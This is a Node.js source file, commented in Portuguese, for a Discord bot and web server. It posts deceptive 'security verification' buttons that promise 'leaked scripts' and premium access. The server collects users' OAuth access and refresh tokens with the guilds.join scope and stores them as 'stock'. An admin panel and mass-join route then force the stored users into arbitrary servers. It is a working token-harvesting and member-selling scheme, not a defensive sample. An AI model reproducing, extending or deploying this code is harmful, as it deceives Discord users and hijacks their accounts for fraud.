require('dotenv').config();
const express = require('express');
const axios = require('axios');
const { Pool } = require('pg');
const { 
    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
    ButtonBuilder, ButtonStyle, PermissionsBitField, ActivityType,
    ApplicationCommandOptionType 
} = require('discord.js');

// --- CONFIGURAÇÕES FIXAS ---
const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID; 
const REDIRECT_TARGET_DEFAULT = 'https://discord.com/app'; 
const REDIRECT_TARGET_GAME = 'https://gamedown.onrender.com/sucess'; 
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD; 

// --- CONFIGURAÇÃO VISUAL (MEMÓRIA) ---
// Se o bot reiniciar, volta para este padrão. Use /config para mudar na hora.
let panelConfig = {
    padrao: {
        titulo: '🛡️ Verificação de Segurança',
        desc: 'Se verifique para poder ter acesso a itens exclusivos no servidor, como: Chat premium, Scripts Vazados (E em beta), e muitas outras coisas!',
        cor: 0x5865F2, // Blurple
        btnText: 'Verificar Agora',
        btnEmoji: '✅'
    },
    game: {
        // AGORA ESTÁ IGUAL AO PADRÃO (Conforme você pediu)
        titulo: '🛡️ Verificação de Segurança',
        desc: 'Se verifique para poder ter acesso a itens exclusivos no servidor, como: Chat premium, Scripts Vazados (E em beta), e muitas outras coisas!',
        cor: 0x5865F2, // Blurple
        btnText: 'Verificar Agora', // Texto igual
        btnEmoji: '✅'
    }
};

// --- BANCO DE DADOS ---
let pool = null;
async function iniciarBanco() {
    if (process.env.DATABASE_URL) {
        pool = new Pool({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });
        try {
            await pool.query(`CREATE TABLE IF NOT EXISTS auth_users (id VARCHAR(255) PRIMARY KEY, username VARCHAR(255), access_token TEXT, refresh_token TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP);`);
            console.log('✅ Banco conectado.');
        } catch (err) { console.error("❌ Erro banco:", err.message); }
    }
}

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

// --- FUNÇÃO AUTH ---
async function handleVerificationCallback(req, res, redirectUri, finalTarget) {
    const { code, state } = req.query; 
    if (!code) return res.send('Erro: Falta código.');
    try {
        const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: process.env.CLIENT_ID, client_secret: process.env.CLIENT_SECRET, code, grant_type: 'authorization_code', redirect_uri: redirectUri, scope: 'identify guilds.join',
        }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

        const { access_token, refresh_token } = tokenResponse.data;
        const userResponse = await axios.get('https://discord.com/api/users/@me', { headers: { Authorization: `Bearer ${access_token}` } });
        const user = userResponse.data;

        if (pool) await pool.query(`INSERT INTO auth_users (id, username, access_token, refresh_token) VALUES ($1, $2, $3, $4) ON CONFLICT (id) DO UPDATE SET access_token = $3, refresh_token = $4;`, [user.id, user.username, access_token, refresh_token]);

        if (state) {
            try {
                const guild = client.guilds.cache.get(state);
                if (guild) {
                    const member = await guild.members.fetch(user.id).catch(() => null);
                    const role = guild.roles.cache.find(r => r.name === 'Auth2 Vetificados');
                    if (member && role) await member.roles.add(role);
                }
            } catch (e) {}
        }

        const ch = client.channels.cache.get(LOG_CHANNEL_ID);
        if(ch) ch.send({ embeds: [new EmbedBuilder().setTitle('📥 Novo Token').setDescription(`**User:** ${user.username}`).setColor('Green')] });

        // Redirecionamento Inteligente (Se for padrão e tiver state, vai pro servidor)
        let urlFinal = finalTarget;
        if (finalTarget === REDIRECT_TARGET_DEFAULT && state) urlFinal = `https://discord.com/channels/${state}`;

        res.send(`<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0; url=${urlFinal}"></head><body>Redirecionando... <script>setTimeout(()=>{window.location.href="${urlFinal}"},300);</script></body></html>`);
    } catch (e) { console.error(e); res.send('Erro auth.'); }
}

// --- ROTAS ---
app.get('/', async (req, res) => {
    let c = 0; if(pool) { try { const r = await pool.query('SELECT COUNT(*) FROM auth_users'); c = r.rows[0].count; } catch(e){} }
    res.send(`Bot Online. Estoque: ${c} <a href="/painel">Painel</a>`);
});
app.get('/painel', (req, res) => res.send(`<form action="/api/mass-join" method="POST"><input type="password" name="password" placeholder="Senha"><input type="text" name="serverId" placeholder="ID"><input type="number" name="amount" placeholder="Qtd"><button>Enviar</button></form>`));
app.post('/api/mass-join', async (req, res) => {
    const { password, serverId, amount } = req.body;
    if(password !== ADMIN_PASSWORD) return res.send('Senha errada');
    if(!pool) return res.send('Sem banco');
    let users = []; try { const r = await pool.query('SELECT * FROM auth_users LIMIT $1', [amount]); users = r.rows; } catch(e){ return res.send('Erro banco'); }
    res.send(`Enviando ${users.length}...`);
    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
    for (const u of users) {
        try { await axios.put(`https://discord.com/api/guilds/${serverId}/members/${u.id}`, { access_token: u.access_token }, { headers: { Authorization: `Bot ${process.env.BOT_TOKEN}` } }); } 
        catch (e) { if(e.response?.status===401) pool.query('DELETE FROM auth_users WHERE id=$1',[u.id]).catch(()=>{}); }
        await sleep(1000);
    }
});
app.get('/callback', async (req, res) => { await handleVerificationCallback(req, res, process.env.REDIRECT_URI, REDIRECT_TARGET_DEFAULT); });
app.get('/auth2', async (req, res) => { await handleVerificationCallback(req, res, process.env.REDIRECT_URI_2, REDIRECT_TARGET_GAME); });

// --- BOT ---
client.once('ready', async () => {
    console.log(`🤖 Bot Logado: ${client.user.tag}`);
    await client.application.commands.set([
        { name: 'setup_auth', description: 'Painel Auth (Padrão)' },
        { name: 'setup_auth2', description: 'Painel Auth (GameDown)' },
        { name: 'postar_painel', description: 'Posta o painel do GameDown em outro canal', options: [{ name: 'canal_id', description: 'ID do canal', type: 3, required: true }] },
        { name: 'estoque', description: 'Ver quantidade salva' },
        { name: 'enviar', description: 'Mass Join', options: [{name:'quantidade',description:'Qtd',type:4,required:true},{name:'servidor_id',description:'ID',type:3,required:true}] },
        // --- NOVO COMANDO DE CONFIG ---
        { 
            name: 'config', 
            description: 'Personaliza o visual dos painéis',
            options: [
                { 
                    name: 'tipo', 
                    description: 'Qual painel editar?', 
                    type: 3, 
                    required: true,
                    choices: [{ name: 'Padrão (Setup 1)', value: 'padrao' }, { name: 'Game (Setup 2/Postar)', value: 'game' }]
                },
                { name: 'titulo', description: 'Novo título', type: 3, required: false },
                { name: 'descricao', description: 'Nova descrição', type: 3, required: false },
                { name: 'botao_texto', description: 'Nome do botão', type: 3, required: false },
                { name: 'botao_emoji', description: 'Emoji do botão', type: 3, required: false }
            ]
        }
    ]);
});

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    
    // --- CONFIG ---
    if (interaction.commandName === 'config') {
        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return interaction.reply({content:'Apenas admin.', ephemeral:true});
        
        const tipo = interaction.options.getString('tipo');
        const titulo = interaction.options.getString('titulo');
        const desc = interaction.options.getString('descricao');
        const btnText = interaction.options.getString('botao_texto');
        const btnEmoji = interaction.options.getString('botao_emoji');

        // Atualiza a memória
        if(titulo) panelConfig[tipo].titulo = titulo;
        if(desc) panelConfig[tipo].desc = desc;
        if(btnText) panelConfig[tipo].btnText = btnText;
        if(btnEmoji) panelConfig[tipo].btnEmoji = btnEmoji;

        interaction.reply({ content: `✅ Configuração do painel **${tipo.toUpperCase()}** atualizada com sucesso!`, ephemeral: true });
    }

    // SETUP 1 (Padrão)
    if (interaction.commandName === 'setup_auth') {
        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        const cfg = panelConfig.padrao;
        const url = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
        
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel(cfg.btnText).setStyle(ButtonStyle.Link).setURL(url).setEmoji(cfg.btnEmoji));
        const embed = new EmbedBuilder().setTitle(cfg.titulo).setDescription(cfg.desc).setColor(cfg.cor).setFooter({ text: 'Sistema Seguro' });
        
        interaction.reply({ content: 'Painel 1 criado.', ephemeral: true });
        interaction.channel.send({ embeds: [embed], components: [row] });
    }

    // SETUP 2 (GameDown - Local)
    if (interaction.commandName === 'setup_auth2') {
        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        if (!process.env.REDIRECT_URI_2) return interaction.reply('Falta REDIRECT_URI_2');
        
        const cfg = panelConfig.game; // Usa config do Game
        const url = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI_2)}&response_type=code&scope=identify+guilds.join&state=${interaction.guild.id}`;
        
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel(cfg.btnText).setStyle(ButtonStyle.Link).setURL(url).setEmoji(cfg.btnEmoji));
        const embed = new EmbedBuilder().setTitle(cfg.titulo).setDescription(cfg.desc).setColor(cfg.cor).setFooter({ text: 'Sistema Seguro' });

        interaction.reply({ content: 'Painel 2 criado.', ephemeral: true });
        interaction.channel.send({ embeds: [embed], components: [row] });
    }

    // POSTAR PAINEL (GameDown - Remoto)
    if (interaction.commandName === 'postar_painel') {
        if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
        const chId = interaction.options.getString('canal_id');
        const ch = client.channels.cache.get(chId);
        if (!ch) return interaction.reply('Canal não achado.');

        const cfg = panelConfig.game; // Usa config do Game
        // Nota: Removemos o 'state' aqui pois o servidor de origem é onde o botão está
        const url = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI_2)}&response_type=code&scope=identify+guilds.join`;
        
        const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel(cfg.btnText).setStyle(ButtonStyle.Link).setURL(url).setEmoji(cfg.btnEmoji));
        const embed = new EmbedBuilder().setTitle(cfg.titulo).setDescription(cfg.desc).setColor(cfg.cor).setFooter({ text: 'Sistema Seguro' });

        ch.send({ embeds: [embed], components: [row] });
        interaction.reply({ content: `Postado em <#${chId}>`, ephemeral: true });
    }
    
    if (interaction.commandName === 'estoque') {
        let count = 0;
        if(pool) { try { const res = await pool.query('SELECT COUNT(*) FROM auth_users'); count = res.rows[0].count; } catch(e) {} }
        interaction.reply({ content: `📦 **Banco SQL:** ${count}`, ephemeral: true });
    }
    if (interaction.commandName === 'enviar') { interaction.reply('Use o painel web: /painel'); }
});

iniciarBanco().then(() => {
    app.listen(process.env.PORT || 3000, () => console.log("ON"));
    client.login(process.env.BOT_TOKEN);
});
